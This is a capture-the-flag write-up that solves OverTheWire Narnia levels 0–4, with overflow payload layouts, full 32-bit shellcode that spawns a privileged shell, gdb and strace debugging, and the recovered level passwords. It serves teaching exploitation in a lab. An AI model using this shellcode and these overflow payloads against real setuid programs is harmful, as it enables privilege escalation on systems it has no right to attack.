# OverTheWire Narnia — Solutions

Live solves against `narnia.labs.overthewire.org:2226` in this run. Narnia is about
buffer overflows and shellcode; sources are in `/narnia/`. For each level: goal,
technique and why it works, exact commands, verification. Recordings in
`recordings/narnia/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → narnia1
- **Account:** `narnia0`, password `narnia0` (given by the game).
- **Goal:** The program initialises `long val = 0x41414141` and reads up to 24 characters into `char buf[20]` with `scanf("%24s")`; if `val` becomes `0xdeadbeef` it `setreuid`s to narnia1 and runs `/bin/sh`.
- **Technique and why it works:** `scanf("%24s")` writes up to 24 bytes into a 20-byte buffer, so bytes 21–24 overwrite the adjacent `long val` (stack layout places `val` immediately after `buf`). Sending 20 filler bytes plus the little-endian encoding of `0xdeadbeef` (`\xef\xbe\xad\xde`) makes the comparison true, and the program hands us a shell as narnia1. The payload must be raw bytes (not the literal text), so it is written with `printf`/Python and piped or typed over a PTY.
- **Commands:**
  ```
  ssh narnia0@narnia.labs.overthewire.org -p 2226
  /narnia/narnia0
  # at the prompt send: 20 'A' bytes followed by \xef\xbe\xad\xde
  # then in the shell it spawns:
  id                                   # uid=14001(narnia1)
  cat /etc/narnia_pass/narnia1
  ```
- **Password for narnia1:** `O8dJypubLr`
- **Verification:** logged in as `narnia1` with this password.
- **Recording:** `recordings/narnia/L0.cast`

## Level 1 → narnia2
- **Account:** `narnia1`.
- **Goal:** The program takes the environment variable `EGG`, casts it to a function pointer, and calls it: `ret = (int (*)())getenv("EGG"); ret();`. Put shellcode there.
- **Technique and why it works:** Any string in the environment can be executed if we place valid machine code in it. We set `EGG` to a NOP sled followed by shellcode. The binary is setuid narnia2, so at the call its effective UID is narnia2. Two details matter: (1) the shellcode must first call `setreuid(geteuid(), geteuid())` — otherwise `execve("/bin/sh")` drops the effective UID back to narnia1 (the binary itself does exactly this); (2) the environment must be passed as *bytes* (`os.execve` with a bytes dict) because Python's `os.environ` UTF-8-encodes `\x90` into `\xc2\x90`, corrupting the code. The shellcode: `geteuid` (201), `setreuid(ebx,ebx)` (70), then `execve("/bin/sh")` (11).
- **Commands:**
  ```
  ssh narnia1@narnia.labs.overthewire.org -p 2226
  # set EGG to NOP*200 + [geteuid; setreuid(euid,euid); execve("/bin/sh")] and exec the binary
  id                                  # uid=14002(narnia2)
  cat /etc/narnia_pass/narnia2
  ```
- **Password for narnia2:** `0h8Tj5fxbv`
- **Verification:** logged in as `narnia2` with this password.
- **Recording:** `recordings/narnia/L1.cast`

## Level 2 → narnia3
- **Account:** `narnia2`, password `0h8Tj5fxbv`.
- **Goal:** `main` does `char buf[128]; strcpy(buf, argv[1]);` — an unbounded copy into a 128-byte stack buffer.
- **Technique and why it works:** `strcpy` copies until the NUL, so an `argv[1]` longer than 128 bytes overwrites the saved frame pointer (offset 128) and the return address (offset 132). ASLR is off (`/proc/sys/kernel/randomize_va_space` = 0) and the stack is executable (`readelf -lW` shows `GNU_STACK ... RWE`), so we put a NOP sled + shellcode inside `argv[1]` and return into the sled. The shellcode calls `setreuid(geteuid(), geteuid())` first — the binary is setuid narnia3, so euid is narnia3; without it `execve("/bin/sh")` would drop back to narnia2 — and then `execve("/bin/sh")`. Because the environment shifts the stack, the exploit sweeps candidate return addresses and detects a hit by a `PWN!` marker the shellcode writes before spawning the shell, then re-execs with the found address.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia2.c` → `char buf[128]; strcpy(buf, argv[1]); printf("%s", buf);`.
2. **Find the buffer and return address in the disassembly.**
   ```
   objdump -d --no-show-raw-insn /narnia/narnia2 | sed -n '/<main>:/,/ret/p'
   ```
   shows `sub $0x80,%esp` and `lea -0x80(%ebp),%eax` before `call strcpy@plt`: the buffer is at `ebp-0x80`, the saved EBP at offset 128 and the return address at offset 132.
3. **Check the binary and the stack.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RWE` (executable stack); `cat /proc/sys/kernel/randomize_va_space` → `0` (no ASLR).
4. **Confirm the layout with gdb.**
   ```
   gdb -batch -ex 'b *0x8049189' -ex 'run AAAA' -ex 'p/x $ebp-0x80' -ex 'p/x $ebp+4' /narnia/narnia2
   # $1 = 0xffffd328   (buffer)      $2 = 0xffffd3ac   (return address)
   ```
   The 4-byte gap between buffer and return address (128 bytes) matches the disassembly.
5. **Write the shellcode in `vim /tmp/l2.asm`.** It is null-free (argv cannot contain NUL bytes) and does three things:
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "PWN!", 4) -- marker so the address sweep can detect a hit
       xor eax, eax
       push eax
       push 0x214e5750
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       xor eax, eax
       mov al, 4
       int 0x80
       ; euid = geteuid(); setreuid(euid, euid) -- keep euid over execve
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
       xor eax, eax
       push eax
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Notes on why it is written this way: `xor eax,eax; mov al,N` avoids a NUL in the immediate; the string `"PWN!"` is pushed as the little-endian dword `0x214e5750` (`P W N !` in memory); `/bin/sh` is pushed as `0x68732f2f` (`hs//`) and `0x6e69622f` (`nib/`); `push eax; push ebx; mov ecx,esp` builds `argv = {"/bin/sh", NULL}`.
6. **Assemble it with nasm and look at the result.**
   ```
   nasm -f elf32 /tmp/l2.asm -o /tmp/l2.o
   objdump -d -M intel /tmp/l2.o
   ```
   `objdump` shows the exact encoding of every instruction, e.g. `push 0x214e5750` = `68 50 57 4e 21`, `mov al,0xc9` = `b0 c9`, `int 0x80` = `cd 80`.
7. **Extract the raw bytes and print them.**
   ```
   objcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin
   xxd -p /tmp/l2.bin
   # 31c0506850574e2189e131db4331d2b20431c0b004cd80
   # 31c0b0c9cd8089c389c131c0b046cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80
   wc -c /tmp/l2.bin      # 64
   ```
   The exploit reads this file instead of re-typing bytes, so the payload provably comes from the assembler.
8. **Build the payload and run the exploit.**
   ```
   python3 /tmp/e_narnia2.py
   ```
   The Python exploit (`L2.py`) builds `payload = b"\x90"*(128-len(sc)) + sc + b"B"*4 + pack("<I", addr)` (128-byte NOP sled + shellcode filling `buf`, 4 bytes of saved EBP, 4-byte return address), forks a child per candidate address in `0xffffd000..0xffffe800`, redirects its stdout/stderr to a pipe, and looks for `PWN!`. On a hit it re-execs attached to the terminal so the shell can be driven.
   The sweep landed at **0xffffd1f8**. That address is inside the `argv[1]` copy on the stack, not inside `buf` — which is why the shellcode is placed at the *end* of the 128-byte block: its own `push` instructions write into `buf` (and below), so they never touch the copy above `argv` where the code runs.
9. **Use the shell.**
   ```
   id                        # uid=14003(narnia3) gid=14002(narnia2)
   cat /etc/narnia_pass/narnia3
   ```
- **Password for narnia3:** `F5AYQwE8PA`
- **Verification:** logged in as `narnia3` with this password (`whoami` → `narnia3`).
- **Recording:** `recordings/narnia/L2.cast`

## Level 3 → narnia4
- **Account:** `narnia3`.
- **Goal:** `main` has `char ifile[32]; char ofile[16] = "/dev/null";` then `strcpy(ifile, argv[1])`, opens `ofile` read-write and `ifile` read-only, and copies 31 bytes between them.
- **Technique and why it works:** `strcpy` into the 32-byte `ifile` overflows into the adjacent `ofile` (which sits just above it on the stack, at `ebp-0x18` vs `ebp-0x38`). If `argv[1]` is a path whose first 32 bytes form a real directory prefix and whose remaining bytes are a writable path, then: `ifile` is truncated to those first 32 bytes, while `ofile` becomes the tail. We use `/tmp/` + 27 `A`s + `/tmp/out3` (41 chars): bytes 1–32 are `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA` and bytes 33+ are `/tmp/out3`. That directory holds a symlink `out3 -> /etc/narnia_pass/narnia4`, and `/tmp/out3` is pre-created writable so `open(ofile, O_RDWR)` succeeds. The setuid program then reads the password (via the symlink) and writes it to `/tmp/out3`, which we can read.
- **Commands:**
  ```
  ssh narnia3@narnia.labs.overthewire.org -p 2226
  D=$(python3 -c 'print("A"*27)')
  mkdir -p "/tmp/$D/tmp"
  ln -sf /etc/narnia_pass/narnia4 "/tmp/$D/tmp/out3"
  touch /tmp/out3; chmod 666 /tmp/out3
  /narnia/narnia3 "/tmp/$D/tmp/out3"
  cat /tmp/out3
  ```
- **Password for narnia4:** `CyWyf6uGWQ`
- **Verification:** logged in as `narnia4` with this password.
- **Recording:** `recordings/narnia/L3.cast`

## Level 4 → narnia5
- **Account:** `narnia4`, password `CyWyf6uGWQ`.
- **Goal:** `main` declares `char buffer[256]`, wipes every environment string (`for(i=0; environ[i]; i++) memset(environ[i], '\0', strlen(environ[i]));`), then does `strcpy(buffer, argv[1])`.
- **Technique and why it works:** the unbounded `strcpy` overflows the 256-byte stack buffer into the saved EBP and return address. Zeroing the environment first is a deliberate hardening attempt: it makes the stack layout identical on every run, so the overflow is fully deterministic (a fixed return address works, no ASLR needed — `randomize_va_space` is 0 and `GNU_STACK` is `RWE`). The shellcode does `geteuid`, `setreuid(euid,euid)`, then `setuid(euid)`, then `execve("/bin/sh")`. **`setuid` is the lesson of this level:** the binary is setuid narnia5, but a plain `setreuid` leaves the *saved* user id at the unprivileged value, so the kernel drops the privilege when `execve` runs the shell. `setuid(euid)` sets real, effective *and saved* ids to narnia5, so the privilege survives the exec.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia4.c` → `char buffer[256];` env wipe; `strcpy(buffer, argv[1]);`.
2. **Find the buffer and return address.**
   ```
   objdump -d --no-show-raw-insn /narnia/narnia4 | sed -n '/<main>:/,/ret/p'
   ```
   shows `sub $0x104,%esp`, `lea -0x104(%ebp),%eax`, then `call strcpy@plt`: the buffer is at `ebp-0x104`, so the saved EBP is at offset **260** and the return address at offset **264**.
3. **Check the binary and the stack.**
   ```
   ls -l /narnia/narnia4      # -r-sr-x--- 1 narnia5 narnia4
   file /narnia/narnia4       # setuid ELF 32-bit LSB executable, Intel i386
   readelf -lW /narnia/narnia4 | grep -E 'GNU_STACK|LOAD'   # GNU_STACK ... RWE
   readelf -S /narnia/narnia4 | grep -E '\.bss|\.data'      # writable data/bss
   cat /proc/sys/kernel/randomize_va_space                  # 0
   ```
4. **Confirm the layout with gdb.**
   ```
   gdb -batch -ex 'b *0x80491f9' -ex 'run AAAA' -ex 'p/x $ebp-0x104' -ex 'p/x $ebp+4' /narnia/narnia4
   # $1 = 0xffffd2a4   (buffer)      $2 = 0xffffd3ac   (return address)
   ```
   The 260-byte gap matches the disassembly.
5. **Write the shellcode in vim** (`vim /tmp/l4.asm`):
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "PWN!", 4) -- marker so the address sweep can detect a hit
       xor eax, eax
       push eax
       push 0x214e5750
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       xor eax, eax
       mov al, 4
       int 0x80
       ; euid = geteuid(); setreuid(euid, euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       ; euid = geteuid(); setuid(euid) -- real, effective AND saved uid,
       ; so the privilege survives execve (plain setreuid does not)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23
       int 0x80
       ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
       xor eax, eax
       push eax
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Syscall numbers: 4 = write, 201 = geteuid, 70 = setreuid, 23 = setuid, 11 = execve.
6. **Assemble and inspect the bytes.**
   ```
   nasm -f elf32 /tmp/l4.asm -o /tmp/l4.o
   objdump -d -M intel /tmp/l4.o          # each instruction's encoding, e.g. push 0x214e5750 = 68 50 57 4e 21
   objcopy -O binary --only-section=.text /tmp/l4.o /tmp/l4.bin
   xxd -p /tmp/l4.bin
   wc -c /tmp/l4.bin                      # 78
   ```
7. **Run the exploit.** `python3 /tmp/e_narnia4.py` reads the assembled bytes from `/tmp/l4.bin` and builds
   `payload = sc + b"\x90"*(260-len(sc)) + b"B"*4 + pack("<I", addr)` — shellcode at the **start** of the buffer, NOPs up to the saved EBP, 4 bytes of saved EBP, 4-byte return address — and sweeps `0xffffd000..0xffffe800` for the `PWN!` marker.

   **The bug we hit and how we found it.** Our first version put the shellcode at the *end* of the buffer (like level 2), and it crashed. `strace -f -e trace=execve,setreuid,setuid,write` showed `write(1,"PWN!",4)`, `setreuid(14004,14004)`, `setuid(14004)`, then `SIGSEGV` — the `execve` never ran. (Under strace the kernel does not honour the setuid bit for a traced process, so the uids read 14004 rather than 14005; the point of the trace is the instruction flow, not the ids.) Disassembling the shellcode (`objdump -d -M intel /tmp/l4.o`) showed why: the marker block leaves `esp` at `buffer+260`, so the `execve` argument `push eax` at offset 0x37 writes to `buffer+256..259` and `push 0x68732f2f` / `push 0x6e69622f` write to `buffer+248..255` — straight into the tail of a shellcode that ends at `buffer+259` (`mov ebx,esp`, `push eax`, `push ebx`, `mov ecx,esp`, `xor edx,edx`, `mov al,0xb`, `int 0x80`). The code then executes overwritten bytes and segfaults (we saw `si_addr=NULL` and `si_addr=0x3722` in two runs — the garbage depends on what was pushed). In level 2 the sweep address lands in the `argv[1]` copy *above* the buffer, so its pushes never touch the running code; in level 4 the code runs inside the buffer itself, so the pushes hit it. The fix is to place the shellcode at offset 0 of the buffer, far below the push region (`buffer+240..251`).
8. **Use the shell.**
   ```
   id                        # uid=14005(narnia5) gid=14004(narnia4)
   cat /etc/narnia_pass/narnia5
   ```
- **Password for narnia5:** `4VhyE9TRcd`
- **Verification:** logged in as `narnia5` with this password (`whoami` → `narnia5`).
- **Recording:** `recordings/narnia/L4.cast`

